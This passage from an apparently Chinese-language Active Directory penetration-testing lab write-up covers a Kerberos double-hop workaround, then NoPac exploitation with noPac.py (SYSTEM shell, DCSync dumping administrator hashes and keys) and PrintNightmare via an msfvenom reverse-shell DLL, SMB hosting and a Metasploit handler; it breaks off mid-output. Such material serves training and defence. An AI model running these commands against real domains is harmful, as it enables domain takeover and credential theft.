  <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40a50000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">ok_as_delegate</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0</span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#3&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">cifs</span>/<span class="title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40a50000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">ok_as_delegate</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0</span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br></pre></td></tr></table></figure><h3 id="Workaround-2-Register-PSSession-Configuration"><a href="#Workaround-2-Register-PSSession-Configuration" class="headerlink" title="Workaround #2: Register PSSession Configuration"></a>Workaround #2: Register PSSession Configuration</h3><p>如果在加入域的主机上，并且可以使用 WinRM 远程连接到另一台主机，该怎么办？或者在 Windows 攻击主机上工作，并使用<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2">Enter-PSSession cmdlet</a>通过 WinRM 连接到目标？在这里，还有另一种选择来更改设置，以便能够直接与 DC 或其他主机&#x2F;资源进行交互，而不必设置 PSCredential 对象并在每个命令中包含凭据（对于某些工具，这可能不是一个选项）。</p><p>首先在远程主机上建立一个 WinRM 会话。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-AEN-DEV01</span>.INLANEFREIGHT.LOCAL <span class="literal">-Credential</span> inlanefreight\backupadm</span><br></pre></td></tr></table></figure><p>在这里，使用的一个技巧是<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2">Register-PSSessionConfiguration</a> cmdlet 注册一个新的会话配置。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Register-PSSessionConfiguration</span> <span class="literal">-Name</span> backupadmsess <span class="literal">-RunAsCredential</span> inlanefreight\backupadm</span><br><span class="line"></span><br><span class="line"> WARNING: When RunAs is enabled <span class="keyword">in</span> a Windows PowerShell session configuration, the Windows security model cannot enforce</span><br><span class="line"> a security boundary between different user sessions that are created by <span class="keyword">using</span> this endpoint. Verify that the Windows</span><br><span class="line">PowerShell runspace configuration is restricted to only the necessary <span class="built_in">set</span> of cmdlets and capabilities.</span><br><span class="line">WARNING: <span class="built_in">Register-PSSessionConfiguration</span> may need to restart the WinRM service <span class="keyword">if</span> a configuration <span class="keyword">using</span> this name has</span><br><span class="line">recently been unregistered, certain system <span class="keyword">data</span> structures may still be cached. <span class="keyword">In</span> that case, a restart of WinRM may be</span><br><span class="line"> required.</span><br><span class="line">All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and session</span><br><span class="line">configurations that are created with the <span class="built_in">Register-PSSessionConfiguration</span> cmdlet, are disconnected.</span><br><span class="line"></span><br><span class="line">   WSManConfig: Microsoft.WSMan.Management\WSMan::localhost\Plugin</span><br><span class="line"></span><br><span class="line"><span class="built_in">Type</span>            Keys                                Name</span><br><span class="line"><span class="literal">----</span>            <span class="literal">----</span>                                <span class="literal">----</span></span><br><span class="line">Container       &#123;Name=backupadmsess&#125;                backupadmsess</span><br></pre></td></tr></table></figure><p>完成后，需要通过输入<code>Restart-Service WinRM</code>当前的 PSSession 来重新启动 WinRM 服务。这会将当前 Session 踢出，因此使用之前设置的命名注册会话启动一个新的 PSSession。</p><p>启动会话后，可以看到双跳问题已消除，如果输入<code>klist</code>，将获得到达域控制器所需的缓存票证。这是可行的，因为本地计算机现在将在用户的上下文中模拟远程计算机<code>backupadm</code>，并且来自本地计算机的所有请求都将直接发送到域控制器。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DEV01 <span class="literal">-Credential</span> INLANEFREIGHT\backupadm <span class="literal">-ConfigurationName</span>  backupadmsess</span><br><span class="line">[<span class="type">DEV01</span>]: <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x2239ba</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">       Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">       KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">       <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">23</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       Renew Time: <span class="number">7</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">13</span>:<span class="number">24</span>:<span class="number">37</span> (local)</span><br><span class="line">       Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">       Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">       Kdc Called: DC01</span><br></pre></td></tr></table></figure><p>现在，可以运行 PowerView 等工具，而无需创建新的 PSCredential 对象。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">DEV01</span>]: <span class="built_in">PS</span> C:\Users\Public&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">azureconnect</span><br><span class="line">backupjob</span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br><span class="line">sqltest</span><br><span class="line">sqlqa</span><br><span class="line">sqldev</span><br><span class="line">mssqladm</span><br><span class="line">svc_sql</span><br><span class="line">sqlprod</span><br><span class="line">sapsso</span><br><span class="line">sapvc</span><br><span class="line">vmwarescvc</span><br></pre></td></tr></table></figure><blockquote><p>注意：无法从 evil-winrm shell 使用 <code>Register-PSSessionConfiguration</code>，因为无法获取凭据弹出窗口。此外，如果尝试通过首先设置 PSCredential 对象，然后尝试通过传递凭据（如 <code>-RunAsCredential $Cred</code>）来运行命令来运行此命令，将收到错误，因为只能从提升的 PowerShell 终端使用 <code>RunAs</code>。因此，此方法无法通过 evil-winrm 会话工作，因为它需要 GUI 访问和适当的 PowerShell 控制台。此外，在测试中，由于 Linux 上的 PowerShell 处理 Kerberos 凭据的方式存在某些限制，无法从 Parrot 或 Ubuntu 攻击主机上的 PowerShell 使用此方法。如果从 Windows 攻击主机进行测试并拥有一组凭据或入侵主机并可以通过 RDP 连接将其用作“跳转主机”来对环境中的主机发起进一步攻击，则此方法仍然非常有效。</p></blockquote><p>还可以使用其他方法，例如 CredSSP、端口转发或注入在目标用户上下文中运行的进程（牺牲进程）。</p><hr><h1 id="Bleeding-Edge-Vulnerabilities"><a href="#Bleeding-Edge-Vulnerabilities" class="headerlink" title="Bleeding Edge Vulnerabilities"></a>Bleeding Edge Vulnerabilities</h1><p>在补丁管理和周期方面，许多组织不会迅速通过其网络推出补丁。正因为如此，可能能够使用非常新的策略快速获得初始访问或域特权升级的胜利。在撰写本文时（2022 年 4 月），本节中展示的三种技术相对较新。与任何攻击一样，如果您不了解这些攻击的工作原理或它们可能对生产环境造成的风险，最好不要在现实世界尝试它们。话虽如此，这些技术可以被认为是“安全的”，并且比<a href="https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/">Zerologon</a>或<a href="https://stealthbits.com/blog/what-is-a-dcshadow-attack-and-how-to-defend-against-it/">DCShadow</a>等攻击破坏性更小。不过，应该始终保持谨慎，做详细的笔记。所有攻击都伴随着风险。</p><h2 id="NoPac-SamAccountName-Spoofing"><a href="#NoPac-SamAccountName-Spoofing" class="headerlink" title="NoPac (SamAccountName Spoofing)"></a>NoPac (SamAccountName Spoofing)</h2><p><a href="https://techcommunity.microsoft.com/t5/security-compliance-and-identity/sam-name-impersonation/ba-p/3042699">Sam_The_Admin 漏洞</a>，也称为<code>noPac</code>或称为<code>SamAccountName Spoofing</code>2021 年底发布的漏洞。此漏洞包含两个 CVE <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278">2021-42278</a>和<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287">2021-42287</a>，允许通过一个命令将域内权限从任何标准域用户提升到域管理员级别访问。以下是每个 CVE 对此漏洞提供的简要分析。</p><table><thead><tr><th>42278</th><th>42287</th></tr></thead><tbody><tr><td><code>42278</code>是安全帐户管理器 (SAM) 的一个绕过漏洞。</td><td><code>42287</code>是 ADDS 中的 Kerberos 特权属性证书 (PAC) 中的一个漏洞。</td></tr></tbody></table><p>此漏洞利用路径利用了将<code>SamAccountName</code>计算机帐户更改为域控制器帐户的能力。默认情况下，经过身份验证的用户最多可以将<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/add-workstations-to-domain">十台计算机添加到域中</a>。执行此操作时，将新主机的名称更改为与域控制器的 SamAccountName 匹配。完成后，必须请求 Kerberos 票证，以使服务以 DC 的名称而不是新名称向发出票证。请求 TGS 时，它将发出具有最接近匹配名称的票证。完成后，将以该服务的身份进行访问，甚至可以在域控制器上获得 SYSTEM shell。此<a href="https://www.secureworks.com/blog/nopac-a-tale-of-two-vulnerabilities-that-could-end-in-ransomware">博客文章</a>详细介绍了攻击流程。</p><p>NoPac 使用 Impacket 中的许多工具与目标 DC 进行通信、上传有效负载以及发出命令。</p><h3 id="Scanning-for-NoPac"><a href="#Scanning-for-NoPac" class="headerlink" title="Scanning for NoPac"></a>Scanning for NoPac</h3><p>注意到<code>ms-DS-MachineAccountQuota</code>属性，用于控制和限制在特定 OU 中创建计算机帐户的权限，默认值是10。当<code>ms-DS-MachineAccountQuota</code> 属性的值设置为 0 意味着该用户或组在特定的组织单位 (OU) 中无法创建任何计算机帐户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                           </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484</span><br><span class="line">[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 663</span><br></pre></td></tr></table></figure><h3 id="NoPac-Getting-a-Shell"><a href="#NoPac-Getting-a-Shell" class="headerlink" title="NoPac &amp; Getting a Shell"></a>NoPac &amp; Getting a Shell</h3><p>有很多不同的方法可以使用 NoPac 来进一步获取访问权限。一种方法是获取具有 SYSTEM 级权限的 shell。可以通过使用以下语法运行 noPac.py 来模拟内置管理员帐户并进入目标域控制器上的半交互式 shell 会话。这可能会很“嘈杂”，也可能会被 AV 或 EDR 阻止。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                               </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Adding Computer Account &quot;WIN-LWJFQMAXRVN$&quot;</span><br><span class="line">[*] MachineAccount &quot;WIN-LWJFQMAXRVN$&quot; password = &amp;A#x8X^5iLva</span><br><span class="line">[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A#x8X^5iLva.</span><br><span class="line">[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01</span><br><span class="line">[*] Saving ticket in ACADEMY-EA-DC01.ccache</span><br><span class="line">[*] Resting the machine account to WIN-LWJFQMAXRVN$</span><br><span class="line">[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value</span><br><span class="line">[*] Using TGT from cache</span><br><span class="line">[*] Impersonating administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Saving ticket in administrator.ccache</span><br><span class="line">[*] Remove ccache of ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Rename ccache with target ...</span><br><span class="line">[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$</span><br><span class="line">[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure><p>注意，使用 smbexec.py 与目标建立了半交互式 shell 会话。使用 smbexec shell 时，需要使用精确路径，而不是使用 cd 浏览目录结构。</p><p>NoPac.py 确实将 TGT 保存在运行漏洞的攻击主机的目录中。可以用它<code>ls</code>来确认。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils</span><br><span class="line">README.md  scanner.py</span><br></pre></td></tr></table></figure><h3 id="noPac-DCSync"><a href="#noPac-DCSync" class="headerlink" title="noPac DCSync"></a>noPac DCSync</h3><p>然后，可以使用 ccache 文件执行传递票证并执行进一步的攻击，例如 DCSync。还可以使用带有<code>-dump</code>标志的工具使用 secretsdump.py 执行 DCSync。此方法仍会在磁盘上创建一个 ccache 文件，需要注意并清理它。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">███    ██  ██████  ██████   █████   ██████ </span><br><span class="line">████   ██ ██    ██ ██   ██ ██   ██ ██      </span><br><span class="line">██ ██  ██ ██    ██ ██████  ███████ ██      </span><br><span class="line">██  ██ ██ ██    ██ ██      ██   ██ ██      </span><br><span class="line">██   ████  ██████  ██      ██   ██  ██████ </span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><h2 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h2><p><code>PrintNightmare</code>是在所有 Windows 操作系统上运行的<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc">打印后台处理程序服务</a>中发现的两个漏洞（ <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">CVE-2021-34527</a>和<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">CVE-2021-1675</a> ）的昵称。许多漏洞都是基于这些漏洞编写的，这些漏洞允许提升权限和远程执行代码。</p><p>可能需要卸载攻击主机上的 Impacket 版本并安装 <a href="https://twitter.com/cube0x0?lang=en">cube0x0 </a> 版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 uninstall impacket</span><br><span class="line">git clone https://github.com/cube0x0/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python3 ./setup.py install</span><br></pre></td></tr></table></figure><h3 id="enum-7"><a href="#enum-7" class="headerlink" title="enum"></a>enum</h3><p>首先，使用<code>rpcdump.py</code>查看<code>Print System Asynchronous Protocol</code>和是否<code>Print System Remote Protocol</code>暴露在目标上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ rpcdump.py @172.16.5.5 | egrep &#x27;MS-RPRN|MS-PAR&#x27;</span><br><span class="line"></span><br><span class="line">Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol </span><br><span class="line">Protocol: [MS-RPRN]: Print System Remote Protocol </span><br></pre></td></tr></table></figure><p>确认这一点后，可以继续尝试利用漏洞。使用<code>msfvenom</code>来制作 DLL 有效负载。</p><h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll &gt; backupscript.dll</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 510 bytes</span><br><span class="line">Final size of dll file: 8704 bytes</span><br></pre></td></tr></table></figure><p>然后，使用<code>smbserver.py</code>在攻击主机上创建的 SMB 共享中托管此有效负载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure><p>一旦创建共享并托管有效载荷，就可以使用 MSF 配置并启动一个多处理程序，负责捕获在目标上执行的反向 shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LHOST 172.16.5.225</span><br><span class="line">LHOST =&gt; 10.3.88.114</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LPORT 8080</span><br><span class="line">LPORT =&gt; 8080</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 172.16.5.225:8080 </span><br></pre></td></tr></table></figure><p>通过共享托管有效载荷，以及多处理程序监听连接，可以尝试对目标运行漏洞利用程序。以下命令是如何使用漏洞利用程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 &#x27;\\172.16.5.225\CompData\backupscript.dll&#x27;</span><br><span class="line"></span><br><span class="line">[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL</span><br><span class="line">[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll</span><br><span class="line">[*] Try 1...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 2...</span><br><span class="line">[*] Stage0: 0</span><br><span class="line">[*] Try 3...</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>请注意，在命令的末尾，包含了托管有效载荷的共享路径（<code>\\&lt;ip address of attack host&gt;\ShareName\nameofpayload.dll</code>）。如果运行漏洞利用后一切顺利，目标将访问共享并执行有效载荷。然后，有效载荷将回调到多处理程序，从而为提供提升的 SYSTEM shell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (200262 bytes) to 172.16.5.5</span><br><span class="line">[*] Meterpreter session 1 opened (172.16.5.225:8080 -&gt; 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\Windows\system32) &gt; shell</span><br><span class="line">Process 5912 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.737]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span 